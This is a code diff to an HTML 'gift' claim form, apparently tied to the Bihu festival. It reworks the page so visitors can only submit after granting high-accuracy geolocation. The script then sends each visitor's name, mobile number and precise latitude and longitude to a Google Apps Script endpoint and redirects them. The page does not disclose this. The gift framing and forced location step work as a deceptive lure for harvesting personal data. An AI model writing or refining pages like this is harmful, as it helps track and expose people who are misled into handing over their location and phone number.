@@ -15,7 +15,7 @@
       font-family:Arial, sans-serif;
     }
     form{
-      background:#ffffff;
+      background:#fff;
       padding:30px;
       border-radius:15px;
       width:100%;
@@ -23,17 +23,22 @@
       box-shadow:0 0 20px rgba(0,0,0,0.3);
       text-align:center;
     }
-    h2{ color:#e65100; }
+    h2{
+      color:#e65100;
+      margin-bottom:20px;
+    }
     input{
       width:100%;
       padding:12px;
       margin:8px 0;
       border-radius:8px;
       border:1px solid #ccc;
+      font-size:15px;
     }
     button{
       width:100%;
       padding:12px;
+      margin-top:10px;
       border:none;
       border-radius:10px;
       background:#2e7d32;
@@ -41,7 +46,14 @@
       font-size:16px;
       cursor:pointer;
     }
-    #status{ margin-top:12px; font-weight:bold; color:#d84315; }
+    button:hover{
+      background:#1b5e20;
+    }
+    #status{
+      margin-top:12px;
+      font-weight:bold;
+      color:#d84315;
+    }
   </style>
 </head>
 
@@ -52,54 +64,69 @@
 
   <input type="text" name="name" placeholder="Your Name" required>
   <input type="text" name="reason" placeholder="Gift Type" required>
+
   <input type="tel" name="mobile"
          placeholder="10-digit Mobile Number"
          maxlength="10"
+         pattern="[0-9]{10}"
          required>
 
   <button type="submit">Received Gift 🎉</button>
-  <p id="status"></p>
+  <p id="status">📍 Please allow location</p>
 </form>
 
 <script>
 const form = document.getElementById("studentForm");
 const statusText = document.getElementById("status");
 
+let locationAllowed = false;
+let userPosition = null;
+
 form.addEventListener("submit", function(e){
   e.preventDefault();
 
-  // mobile validation
+  // ✅ Mobile validation
   if (!/^[0-9]{10}$/.test(form.mobile.value)) {
     statusText.innerText = "❌ Enter valid 10-digit mobile number";
     return;
   }
 
-  statusText.innerText = "📍 Please allow location…";
+  // ❌ Location not allowed yet
+  if (!locationAllowed) {
+    statusText.innerText = "📍 Allow location first";
+    requestLocation();
+    return;
+  }
 
-  // save name
+  // ✅ Save name for next page
   localStorage.setItem("bihuName", form.name.value);
 
+  sendData();
+});
+
+function requestLocation(){
   navigator.geolocation.getCurrentPosition(
-    function(position){
-      // ✅ ONLY IF LOCATION ALLOWED
-      sendData(position);
+    pos => {
+      locationAllowed = true;
+      userPosition = pos;
+      statusText.innerText = "✅ Location allowed. Click submit again.";
     },
-    function(){
-      // ❌ LOCATION DENIED
-      statusText.innerText = "❌ Location is required to continue";
+    err => {
+      locationAllowed = false;
+      statusText.innerText = "❌ Location denied. Enable from browser settings.";
     },
     { enableHighAccuracy:true, timeout:15000 }
   );
-});
+}
 
-function sendData(position){
+function sendData(){
   const data = {
     name: form.name.value,
     reason: form.reason.value,
     mobile: form.mobile.value,
-    latitude: position.coords.latitude,
-    longitude: position.coords.longitude,
-    accuracy: position.coords.accuracy
+    latitude: userPosition.coords.latitude,
+    longitude: userPosition.coords.longitude,
+    accuracy: userPosition.coords.accuracy
   };
 
   fetch("https://script.google.com/macros/s/AKfycbz3rQv9nyn-B_NNyy2Vyj6WN2hZcsFgpncziEsCGhn4sB-Cwm-gP52RnvphqzH1QxCL/exec",{
@@ -109,7 +136,6 @@ function sendData(position){
     body: JSON.stringify(data)
   });
 
-  // 👉 redirect ONLY after location
   window.location.href = "bihuz.html";
 }
 </script>
